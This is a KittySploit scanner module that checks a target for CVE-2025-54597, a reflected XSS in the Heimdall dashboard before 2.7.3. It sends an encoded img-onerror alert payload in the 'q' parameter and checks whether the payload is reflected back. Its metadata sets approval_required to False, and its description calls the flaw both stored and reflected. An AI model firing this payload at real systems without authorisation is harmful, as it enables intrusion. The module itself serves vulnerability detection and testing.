#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LinuxServer."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Heimdall Application Dashboard < 2.7.3 - Reflected XSS Detection',
        'description': 'LinuxServer.io Heimdall < 2.7.3 contains a stored XSS caused by improper sanitization of the \\"q\\" parameter, letting remote attackers execute scripts, exploit requires crafted input.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'heimdall', 'xss', 'reflected', 'linuxserver', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-54597',
            'https://github.com/linuxserver/Heimdall/releases/tag/v2.7.3',
            'https://github.com/linuxserver/Heimdall/commit/6b9f61b0e672c37b807ff338e1a3fdaa8f39a8a6',
        ],
        'cve': 'CVE-2025-54597',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('heimdall', 'items/pintoggle',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/?q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"><img src=x onerror=alert(document.domain)>',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Heimdall Application Dashboard < 2.7.3 - Reflected XSS detected', path=path)
            return True
        return False

